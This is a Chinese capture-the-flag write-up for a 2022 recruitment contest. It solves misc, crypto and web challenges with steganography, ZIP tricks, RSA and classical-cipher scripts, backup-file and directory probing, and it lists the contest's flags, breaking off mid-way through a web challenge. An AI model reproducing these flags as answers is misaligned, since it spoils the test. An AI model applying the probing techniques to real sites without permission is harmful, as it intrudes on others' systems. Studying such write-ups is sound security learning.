<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"># coding=utf-8</span><br><span class="line"> </span><br><span class="line">import os, base64</span><br><span class="line"> </span><br><span class="line">img_str = &#x27;base64&#x27;# 替换你的base64到这里</span><br><span class="line">img_data = base64.b64decode(img_str)# 注意：如果是&quot;data:image/jpg:base64,&quot;，那你保存的就要以png格式，如果是&quot;data:image/png:base64,&quot;那你保存的时候就以jpg格式。</span><br><span class="line">with open(&#x27;001.png&#x27;, &#x27;wb&#x27;) as f:</span><br><span class="line">      f.write(img_data)</span><br><span class="line">print &#x27;successful&#x27;</span><br></pre></td></tr></table></figure>

<p><img src="/./../img/2022%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%AE%9E%E9%AA%8C%E5%AE%A4%E6%8B%9B%E6%96%B0%E8%B5%9BWriteUp/image-20221114195051889.png"></p>
<p>得到了flag后半段。</p>
<p>拼接：</p>
<p>qsnctf{b5512946-d7ac-45c9-afd0-a3f28ba547ea}</p>
<p><img src="/./../img/2022%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%AE%9E%E9%AA%8C%E5%AE%A4%E6%8B%9B%E6%96%B0%E8%B5%9BWriteUp/image-20221114195225620.png"></p>
<h2 id="吉他"><a href="#吉他" class="headerlink" title="吉他"></a>吉他</h2><p><img src="/./../img/2022%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%AE%9E%E9%AA%8C%E5%AE%A4%E6%8B%9B%E6%96%B0%E8%B5%9BWriteUp/image-20221114195347647.png"></p>
<p>下载附件，得到压缩包，但是提示需要输入密码。</p>
<p><img src="/./../img/2022%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%AE%9E%E9%AA%8C%E5%AE%A4%E6%8B%9B%E6%96%B0%E8%B5%9BWriteUp/image-20221114195608393.png"></p>
<p>使用010Editor打开，发现好像又是伪加密，修改加密位。</p>
<p><img src="/./../img/2022%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%AE%9E%E9%AA%8C%E5%AE%A4%E6%8B%9B%E6%96%B0%E8%B5%9BWriteUp/image-20221114195438332.png"></p>
<p>将0h-6d的09修改为00</p>
<p><img src="/./../img/2022%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%AE%9E%E9%AA%8C%E5%AE%A4%E6%8B%9B%E6%96%B0%E8%B5%9BWriteUp/image-20221114195554335.png"></p>
<p><img src="/./../img/2022%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%AE%9E%E9%AA%8C%E5%AE%A4%E6%8B%9B%E6%96%B0%E8%B5%9BWriteUp/image-20221114195638660.png"></p>
<p>有一个加密的7zip文件，有一个吉他.aac</p>
<img src="./../img/2022弱口令实验室招新赛WriteUp/image-20221114195747450.png" style="zoom:50%;" />

<p>只能播放6秒，所以文件肯定有很多的填充数据。</p>
<p>7z压缩包的密码，经过测试，可能是Guitar、吉他、jita等，最终密码是jita。</p>
<p><img src="/./../img/2022%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%AE%9E%E9%AA%8C%E5%AE%A4%E6%8B%9B%E6%96%B0%E8%B5%9BWriteUp/image-20221114201040553.png"></p>
<p>在吉他.jpg文件末尾，找到很像flag的东西，可能是一部分。</p>
<p>46dc-823a-9c33565c6bde}</p>
<p><img src="/./../img/2022%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%AE%9E%E9%AA%8C%E5%AE%A4%E6%8B%9B%E6%96%B0%E8%B5%9BWriteUp/image-20221114201126041.png"></p>
<p>吉他.acc的末尾，有一段flag开头的base64</p>
<p><img src="/./../img/2022%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%AE%9E%E9%AA%8C%E5%AE%A4%E6%8B%9B%E6%96%B0%E8%B5%9BWriteUp/image-20221114201154153.png"></p>
<p>嗯….尬住</p>
<p>吉他.jpg，通过steghide，密码guitar得到flag.txt</p>
<p><img src="/./../img/2022%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%AE%9E%E9%AA%8C%E5%AE%A4%E6%8B%9B%E6%96%B0%E8%B5%9BWriteUp/image-20221114202703158.png"></p>
<p><img src="/./../img/2022%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%AE%9E%E9%AA%8C%E5%AE%A4%E6%8B%9B%E6%96%B0%E8%B5%9BWriteUp/image-20221114203257369.png"></p>
<p>得到-049f-</p>
<p>应该是flag中段</p>
<p><img src="/./../img/2022%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%AE%9E%E9%AA%8C%E5%AE%A4%E6%8B%9B%E6%96%B0%E8%B5%9BWriteUp/image-20221114204202292.png"></p>
<p>在acc文件中，有众多qsnctf开头的内容，结合我们刚刚获取到的内容如下：</p>
<p>qnsctf{74e0df3c–049f-46dc-823a-9c33565c6bde}</p>
<p>可能是防止直接搜索qsn，所以翻转了qsn为qns，这里赛事公告有说flag是qsnctf开头，所以改正过来。</p>
<p>由于uuid是qsnctf{74e0df3c-049f-46dc-823a-9c33565c6bde}，删除多余的横线，得到flag。</p>
<h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="Snake"><a href="#Snake" class="headerlink" title="Snake"></a>Snake</h2><p><img src="/./../img/2022%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%AE%9E%E9%AA%8C%E5%AE%A4%E6%8B%9B%E6%96%B0%E8%B5%9BWriteUp/image-20221114234115992.png"></p>
<p>题目描述说这玩意是个象形题，Snake，也就是蛇，那么flag可能是像蛇一样</p>
<p><img src="/./../img/2022%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%AE%9E%E9%AA%8C%E5%AE%A4%E6%8B%9B%E6%96%B0%E8%B5%9BWriteUp/image-20221114234157820.png"></p>
<p>打开文件，是个表格：</p>
<table>
<thead>
<tr>
<th>7</th>
<th>1</th>
<th>7</th>
<th>3</th>
<th>6</th>
<th>E</th>
<th>6</th>
<th>3</th>
<th>7</th>
<th>4</th>
<th>6</th>
<th>6</th>
<th>7</th>
<th>B</th>
<th>3</th>
<th>3</th>
<th>3</th>
<th>9</th>
<th>3</th>
<th>9</th>
<th>6</th>
<th>2</th>
<th>3</th>
<th>1</th>
<th>3</th>
<th>0</th>
</tr>
</thead>
<tbody><tr>
<td>D</td>
<td>2</td>
<td>2</td>
<td>6</td>
<td>1</td>
<td>3</td>
<td>9</td>
<td>3</td>
<td>4</td>
<td>3</td>
<td>D</td>
<td>2</td>
<td>9</td>
<td>3</td>
<td>6</td>
<td>6</td>
<td>3</td>
<td>3</td>
<td>3</td>
<td>6</td>
<td>D</td>
<td>2</td>
<td>4</td>
<td>6</td>
<td>3</td>
<td>6</td>
</tr>
<tr>
<td>6</td>
<td>4</td>
<td>6</td>
<td>6</td>
<td>6</td>
<td>2</td>
<td>3</td>
<td>5</td>
<td>6</td>
<td>4</td>
<td>3</td>
<td>0</td>
<td>3</td>
<td>3</td>
<td>6</td>
<td>5</td>
<td>3</td>
<td>4</td>
<td>6</td>
<td>3</td>
<td>6</td>
<td>4</td>
<td>3</td>
<td>0</td>
<td>7</td>
<td>D</td>
</tr>
</tbody></table>
<p>71736E63</p>
<p><img src="/./../img/2022%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%AE%9E%E9%AA%8C%E5%AE%A4%E6%8B%9B%E6%96%B0%E8%B5%9BWriteUp/image-20221115001025975.png"></p>
<p>那么第一行应该就是hex了</p>
<p>71 73 6E 63 74 66 7B 33 39 39 62 31 30 得到 qsnctf{399b10</p>
<p>第二行，D2 26 13得到的是</p>
<p><img src="/./../img/2022%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%AE%9E%E9%AA%8C%E5%AE%A4%E6%8B%9B%E6%96%B0%E8%B5%9BWriteUp/image-20221115001405804.png"></p>
<p>尝试63 64 2D 63 33 66 得到 cd-c3f</p>
<p>那么第二行就是63 64 2D 63 33 66 39 2D 34 39 31 62 2D 也就是 cd-c3f9-491b-</p>
<p>按照之前的顺序，那第三行应该是顺序的 64 66 62 35 64 30 33 65 34 63 64 30 7D 也就是 dfb5d03e4cd0}</p>
<p>flag为qsnctf{399b10cd-c3f9-491b-dfb5d03e4cd0}</p>
<h2 id="82-83-65"><a href="#82-83-65" class="headerlink" title="82.83.65"></a>82.83.65</h2><p>这题目名称挺奇怪的，但是应该是ASCII对应的RSA。</p>
<p><img src="/./../img/2022%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%AE%9E%E9%AA%8C%E5%AE%A4%E6%8B%9B%E6%96%B0%E8%B5%9BWriteUp/image-20221115115201677.png"></p>
<p>题目描述中的欧拉函数，又证明了这一点。直接下载附件，然后看看是什么东西吧。</p>
<p><img src="/./../img/2022%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%AE%9E%E9%AA%8C%E5%AE%A4%E6%8B%9B%E6%96%B0%E8%B5%9BWriteUp/image-20221115115320156.png"></p>
<p>得到了一个py文件，内容如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> binascii <span class="keyword">import</span> a2b_hex,b2a_hex</span><br><span class="line"></span><br><span class="line">flag = <span class="string">b&quot;*********************&quot;</span></span><br><span class="line"></span><br><span class="line">p = <span class="number">262248800182277040650192055439906580479</span></span><br><span class="line">q = <span class="number">262854994239322828547925595487519915551</span></span><br><span class="line"></span><br><span class="line">e = <span class="number">65533</span></span><br><span class="line">n = p*q</span><br><span class="line"></span><br><span class="line">d = gmpy2.invert(e,(p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line"><span class="comment"># print(d)</span></span><br><span class="line">c = <span class="built_in">pow</span>(<span class="built_in">int</span>(b2a_hex(flag),<span class="number">16</span>),e,n)</span><br><span class="line"><span class="built_in">print</span>(c)</span><br><span class="line"><span class="comment"># C = 31021919570683223794356421266753186826747161146739784961769368259629146487802</span></span><br></pre></td></tr></table></figure>

<p>题目给了我们p和q，e是65533，那么n其实也给了我们，只需要欧拉求d，然后pow求c，接着通过已知的e、n、d和c得到m即可得到Flag。</p>
<p>那么直接来写一下脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> binascii <span class="keyword">import</span> a2b_hex,b2a_hex</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line">p = <span class="number">262248800182277040650192055439906580479</span></span><br><span class="line">q = <span class="number">262854994239322828547925595487519915551</span></span><br><span class="line">e = <span class="number">65533</span></span><br><span class="line">n = p*q</span><br><span class="line">d = gmpy2.invert(e,(p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line">c = <span class="built_in">pow</span>(<span class="built_in">int</span>(b2a_hex(flag),<span class="number">16</span>),e,n)</span><br><span class="line"><span class="built_in">print</span> c</span><br><span class="line">c = <span class="number">27565231154623519221597938803435789010285480123476977081867877272451638645710</span></span><br><span class="line">c = m^e % n</span><br><span class="line">m = c^d % n</span><br><span class="line">m = <span class="built_in">pow</span>(c,d,n)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br></pre></td></tr></table></figure>

<h2 id="CryptoSOS"><a href="#CryptoSOS" class="headerlink" title="CryptoSOS"></a>CryptoSOS</h2><p><img src="/./../img/2022%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%AE%9E%E9%AA%8C%E5%AE%A4%E6%8B%9B%E6%96%B0%E8%B5%9BWriteUp/image-20221115204344061.png"></p>
<p>emm 下载附件</p>
<p><img src="/./../img/2022%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%AE%9E%E9%AA%8C%E5%AE%A4%E6%8B%9B%E6%96%B0%E8%B5%9BWriteUp/image-20221115204420771.png"></p>
<p>看着确实很像flag，但是肯定交不上去，这肯定是被操作过了的。</p>
<p>试试使用平台的CyberChef看看</p>
<p><img src="/./../img/2022%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%AE%9E%E9%AA%8C%E5%AE%A4%E6%8B%9B%E6%96%B0%E8%B5%9BWriteUp/image-20221115204507468.png"></p>
<p><img src="/./../img/2022%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%AE%9E%E9%AA%8C%E5%AE%A4%E6%8B%9B%E6%96%B0%E8%B5%9BWriteUp/image-20221115204636323.png"></p>
<p>自动没解出来，多少是带点科技与狠活</p>
<p>这种东西，要么凯撒、仿射，反正，基本上都是移位作业或者替代作业，并且字符表里没有{}两个符号。那么我们纯猜仿射。</p>
<p><img src="/./../img/2022%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%AE%9E%E9%AA%8C%E5%AE%A4%E6%8B%9B%E6%96%B0%E8%B5%9BWriteUp/image-20221115205047294.png"></p>
<p>当a和b都等于23时，flag为qsnctf{d990d395-f7b7-4eed-b084-a2f4590db34e}</p>
<p>提交，正确！</p>
<h2 id="Baby-RSA"><a href="#Baby-RSA" class="headerlink" title="Baby RSA"></a>Baby RSA</h2><p><img src="/./../img/2022%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%AE%9E%E9%AA%8C%E5%AE%A4%E6%8B%9B%E6%96%B0%E8%B5%9BWriteUp/image-20221115210340464.png"></p>
<p>下载附件，得到了attachment.zip，包含一个<code>encode.py</code>和<code>hint.txt</code></p>
<p><img src="/./../img/2022%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%AE%9E%E9%AA%8C%E5%AE%A4%E6%8B%9B%E6%96%B0%E8%B5%9BWriteUp/image-20221115210756151.png"></p>
<p>得到了p、n、c</p>
<p>pow函数需要的东西是e、n、m求c，那么我们c有了，但是没有e，这就很难受了。</p>
<p>c是经过Base64编码后倒序（翻转）的，我们需要翻转后Bas64解码，得到c</p>
<p><img src="/./../img/2022%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%AE%9E%E9%AA%8C%E5%AE%A4%E6%8B%9B%E6%96%B0%E8%B5%9BWriteUp/image-20221117092536049.png"></p>
<p>但是脚本中的e是随机数，从20000-50000随机取。</p>
<p>我们需要通过循环，然后解密，判断哪个解密得到的是flag格式“qsnctf{}”</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">p=<span class="number">185392927331398754034773152474166007097</span></span><br><span class="line">n=<span class="number">33047182186833739970146873552408478599841138065558351794468963853252513446871</span></span><br><span class="line">c=<span class="string">&quot;=gzMxUDM5gTN1UDN5kzNwYzM5QjNyEDOwEjN0YzM3gTN1ATM2ITO1gDN0QTNzEDMxcDO5YDM0UjN0AjN0EzM4gzM4YzM4gTO3ITOzAjM&quot;</span></span><br><span class="line"><span class="built_in">print</span>(base64.b64decode(c[::-<span class="number">1</span>]))</span><br><span class="line">cipher=<span class="built_in">int</span>(base64.b64decode(c[::-<span class="number">1</span>]))</span><br><span class="line">q=n//p</span><br><span class="line">phi_n=(p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line"><span class="keyword">for</span> e <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20000</span>,<span class="number">50000</span>):</span><br><span class="line">	<span class="keyword">if</span>(gmpy2.gcd(e,phi_n)==<span class="number">1</span>):</span><br><span class="line">		d=gmpy2.invert(e,phi_n)</span><br><span class="line">		m=<span class="built_in">pow</span>(cipher,d,n)</span><br><span class="line">		flag1=<span class="built_in">hex</span>(m)[<span class="number">2</span>:]</span><br><span class="line">		<span class="keyword">if</span>(<span class="built_in">len</span>(<span class="built_in">str</span>(flag1))%<span class="number">2</span>==<span class="number">1</span>):</span><br><span class="line">			flag1=<span class="string">&#x27;0&#x27;</span>+flag1</span><br><span class="line">		flag2=flag1.decode(<span class="string">&#x27;hex&#x27;</span>)</span><br><span class="line">		<span class="keyword">if</span>(<span class="string">&#x27;qsnctf&#123;&#x27;</span> <span class="keyword">in</span> flag2 <span class="keyword">and</span> <span class="string">&#x27;&#125;&#x27;</span> <span class="keyword">in</span> flag2):</span><br><span class="line">			<span class="built_in">print</span>(flag2)</span><br></pre></td></tr></table></figure>

<p><img src="/./../img/2022%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%AE%9E%E9%AA%8C%E5%AE%A4%E6%8B%9B%E6%96%B0%E8%B5%9BWriteUp/image-20221117092732366.png"></p>
<p>得到Flag</p>
<h2 id="What"><a href="#What" class="headerlink" title="What"></a>What</h2><p><img src="/./../img/2022%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%AE%9E%E9%AA%8C%E5%AE%A4%E6%8B%9B%E6%96%B0%E8%B5%9BWriteUp/image-20221117093114336.png"></p>
<p>下载附件，得到一个很像flag的字符和key</p>
<p><img src="/./../img/2022%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%AE%9E%E9%AA%8C%E5%AE%A4%E6%8B%9B%E6%96%B0%E8%B5%9BWriteUp/image-20221117093142112.png"></p>
<p>常用的使用key解密的加密方法其实不多，我们多尝试几次</p>
<p>因为qsnctf后包含了{}这两个符号，所以这个加密大概率不支持加密{}这样的符号。</p>
<p>维吉尼亚其实就是一个很好的例子，我们先试试。</p>
<p>由于维吉尼亚的key是不支持符号和数字的</p>
<p>并且key后面是三个***，可能是3个字符的，我们试试qsn、rkl这样的显眼的字符</p>
<p><img src="/./../img/2022%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%AE%9E%E9%AA%8C%E5%AE%A4%E6%8B%9B%E6%96%B0%E8%B5%9BWriteUp/image-20221117093451251.png"></p>
<p>维吉尼亚，得到的结果是vigenerciphersoeasy，flag那就是qsnctf{vigenerciphersoeasy}</p>
<h2 id="奇怪又奇怪"><a href="#奇怪又奇怪" class="headerlink" title="奇怪又奇怪"></a>奇怪又奇怪</h2><p><img src="/./../img/2022%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%AE%9E%E9%AA%8C%E5%AE%A4%E6%8B%9B%E6%96%B0%E8%B5%9BWriteUp/image-20221117095759285.png"></p>
<p><img src="/./../img/2022%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%AE%9E%E9%AA%8C%E5%AE%A4%E6%8B%9B%E6%96%B0%E8%B5%9BWriteUp/image-20221117095749356.png"></p>
<p>得到一串奇怪的文本，很像Base64</p>
<p><img src="/./../img/2022%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%AE%9E%E9%AA%8C%E5%AE%A4%E6%8B%9B%E6%96%B0%E8%B5%9BWriteUp/image-20221117095828145.png"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">U2FsdGVkX18D7HXP+Tof5LYll5tcnz0tq5LlVtJG4H41B0qzg1l8Y7PSGGr2o30TljuERiFrMKtTWsTH/Laj54WuZwvSg1nVjs2ZZ/JJD95ZUAth19jjdljgbgBxH81/IHhlpGKB7CP2r1kmxH1dtddVj5nJSU0LPXiB58w+X2TgrbCarFOXE5AlUE4dThNRSf+kPMmUims=</span><br></pre></td></tr></table></figure>

<p>结果很像Base64，但是又解不出来了，那么试试看DES、AES或者RC4</p>
<p>根据之前的题目，key可能是qsn、qsnctf、123456这样的东西</p>
<p><img src="/./../img/2022%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%AE%9E%E9%AA%8C%E5%AE%A4%E6%8B%9B%E6%96%B0%E8%B5%9BWriteUp/image-20221117100806162.png"></p>
<p>DES解密，得到了一串密文</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">U2FsdGVkX1/CYFPc68XNdZ+W6O6kIEcemoV7iDpHmrkoh8Vu2R1/Wkp2fJw6p/PYjfcnNha5tKhh+E4ahhij1xvk8kwf7sc5+ubQrzmf4PahNkgEbXsTKQVpe2JdQ21m</span><br></pre></td></tr></table></figure>

<p><img src="/./../img/2022%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%AE%9E%E9%AA%8C%E5%AE%A4%E6%8B%9B%E6%96%B0%E8%B5%9BWriteUp/image-20221117100945737.png"></p>
<p>RC4又得到了类似的密文</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">U2FsdGVkX1/pJehviBzes9aK66qycToTUvJmoaRXmzM6exiAU6xYY8bJFvHo+9sIyfoLOhbApBG78OAA</span><br></pre></td></tr></table></figure>

<p><img src="/./../img/2022%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%AE%9E%E9%AA%8C%E5%AE%A4%E6%8B%9B%E6%96%B0%E8%B5%9BWriteUp/image-20221117101032734.png"></p>
<p>再次RC4解密，得到Flag：qsnctf{b97c2a6d-c8a2-4bed-bbb9-e845ec58844f}</p>
<h2 id="BoomThis"><a href="#BoomThis" class="headerlink" title="BoomThis"></a>BoomThis</h2><p><img src="/./../img/2022%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%AE%9E%E9%AA%8C%E5%AE%A4%E6%8B%9B%E6%96%B0%E8%B5%9BWriteUp/image-20221117101851226.png"></p>
<p><img src="/./../img/2022%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%AE%9E%E9%AA%8C%E5%AE%A4%E6%8B%9B%E6%96%B0%E8%B5%9BWriteUp/image-20221117101903193.png"></p>
<p><img src="/./../img/2022%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%AE%9E%E9%AA%8C%E5%AE%A4%E6%8B%9B%E6%96%B0%E8%B5%9BWriteUp/image-20221117101910630.png"></p>
<p>下载附件，得到如下内容：</p>
<p><img src="/./../img/2022%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%AE%9E%E9%AA%8C%E5%AE%A4%E6%8B%9B%E6%96%B0%E8%B5%9BWriteUp/image-20221117101944485.png"></p>
<p>提示“密钥加密的块算法”</p>
<p>应该非常关键</p>
<p><img src="/./../img/2022%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%AE%9E%E9%AA%8C%E5%AE%A4%E6%8B%9B%E6%96%B0%E8%B5%9BWriteUp/image-20221117102246027.png"></p>
<p>百度之后，得到DES是一种<code>使用密钥加密的块算法</code>。</p>
<p>那么qsnctf-***可能就是密钥了</p>
<p>尝试了qsnctf-123、qsnctf-abc、qsnctf-2022这样的类似组合好像都不对</p>
<p>其实也可能是日期时间</p>
<p><img src="/./../img/2022%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%AE%9E%E9%AA%8C%E5%AE%A4%E6%8B%9B%E6%96%B0%E8%B5%9BWriteUp/image-20221117105916142.png"></p>
<p>测试了可能是出题时间的日期，得到Flag</p>
<h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="签到小能手"><a href="#签到小能手" class="headerlink" title="签到小能手"></a>签到小能手</h2><p><img src="/./../img/2022%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%AE%9E%E9%AA%8C%E5%AE%A4%E6%8B%9B%E6%96%B0%E8%B5%9BWriteUp/image-20221114204707473.png"></p>
<p>启动容器，打开。</p>
<p>提示flag就在这里，并且题目的提示说明这里是index.php，并且flag就在文件的变量中。</p>
<p><img src="/./../img/2022%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%AE%9E%E9%AA%8C%E5%AE%A4%E6%8B%9B%E6%96%B0%E8%B5%9BWriteUp/image-20221114204806727.png"></p>
<p>访问index.php.bak，打开，应该就有flag了。</p>
<p><img src="/./../img/2022%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%AE%9E%E9%AA%8C%E5%AE%A4%E6%8B%9B%E6%96%B0%E8%B5%9BWriteUp/image-20221114204839391.png"></p>
<p>由于docker容器不支持运行Windows，所以无法给大家真实的.bak备份文件，只能手敲了。</p>
<p>Flag：qsnctf{14045401-c067-42bc-903a-e0a64b611c75}</p>
<h2 id="小镇做题家"><a href="#小镇做题家" class="headerlink" title="小镇做题家"></a>小镇做题家</h2><p><img src="/./../img/2022%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%AE%9E%E9%AA%8C%E5%AE%A4%E6%8B%9B%E6%96%B0%E8%B5%9BWriteUp/image-20221114211229400.png"></p>
<p>小镇做题家，可能有点爱学习，网站都不写了。</p>
<p><img src="/./../img/2022%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%AE%9E%E9%AA%8C%E5%AE%A4%E6%8B%9B%E6%96%B0%E8%B5%9BWriteUp/image-20221114211413912-1668431654494-1.png"></p>
<p>dirsearch一把梭</p>
<p><img src="/./../img/2022%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%AE%9E%E9%AA%8C%E5%AE%A4%E6%8B%9B%E6%96%B0%E8%B5%9BWriteUp/image-20221114211837040-1668431917845-3.png"></p>
<p>我们看看robots.txt有什么东西</p>
<p><img src="/./../img/2022%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%AE%9E%E9%AA%8C%E5%AE%A4%E6%8B%9B%E6%96%B0%E8%B5%9BWriteUp/image-20221114211905885.png"></p>
<p><img src="/./../img/2022%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%AE%9E%E9%AA%8C%E5%AE%A4%E6%8B%9B%E6%96%B0%E8%B5%9BWriteUp/image-20221114211925788.png"></p>
<p>直接访问&#x2F;GAME&#x2F;目录会403，我们试试访问index.php或者index.html</p>
<p><img src="/./../img/2022%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%AE%9E%E9%AA%8C%E5%AE%A4%E6%8B%9B%E6%96%B0%E8%B5%9BWriteUp/image-20221114212126481.png"></p>
<p>为了截图，竟然失败了qwq</p>
<p><img src="/./../img/2022%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%AE%9E%E9%AA%8C%E5%AE%A4%E6%8B%9B%E6%96%B0%E8%B5%9BWriteUp/image-20221114212151141.png"></p>
<p><img src="/./../img/2022%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%AE%9E%E9%AA%8C%E5%AE%A4%E6%8B%9B%E6%96%B0%E8%B5%9BWriteUp/image-20221114212435297.png"></p>
<p>一个贪吃蛇，真的不想做了</p>
<p><img src="/./../img/2022%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%AE%9E%E9%AA%8C%E5%AE%A4%E6%8B%9B%E6%96%B0%E8%B5%9BWriteUp/image-20221114212511724.png"></p>
<p> 看了一下源码，发现主要的是snake.js</p>
<p><img src="/./../img/2022%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%AE%9E%E9%AA%8C%E5%AE%A4%E6%8B%9B%E6%96%B0%E8%B5%9BWriteUp/image-20221114212630947.png"></p>
<p>这里有些BASE64的内容</p>
<p><img src="/./../img/2022%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%AE%9E%E9%AA%8C%E5%AE%A4%E6%8B%9B%E6%96%B0%E8%B5%9BWriteUp/image-20221114212710096.png"></p>
<p><code>恭喜你，题目的关键在于/GAME/f14g_in_there_hha/index.php中！</code></p>
<p><img src="/./../img/2022%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%AE%9E%E9%AA%8C%E5%AE%A4%E6%8B%9B%E6%96%B0%E8%B5%9BWriteUp/image-20221114212755337.png"></p>
<p>那么，首先给他一个?payload&#x3D;a.txt</p>
<p><img src="/./../img/2022%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%AE%9E%E9%AA%8C%E5%AE%A4%E6%8B%9B%E6%96%B0%E8%B5%9BWriteUp/image-20221114212843722.png"></p>
<p>那我们试试访问a.txt是否有文件</p>
<p><img src="/./../img/2022%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%AE%9E%E9%AA%8C%E5%AE%A4%E6%8B%9B%E6%96%B0%E8%B5%9BWriteUp/image-20221114212918954.png"></p>
<p>这里应该是”什么也没有“</p>
<p><img src="/./../img/2022%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%AE%9E%E9%AA%8C%E5%AE%A4%E6%8B%9B%E6%96%B0%E8%B5%9BWriteUp/image-20221114213133525.png"></p>
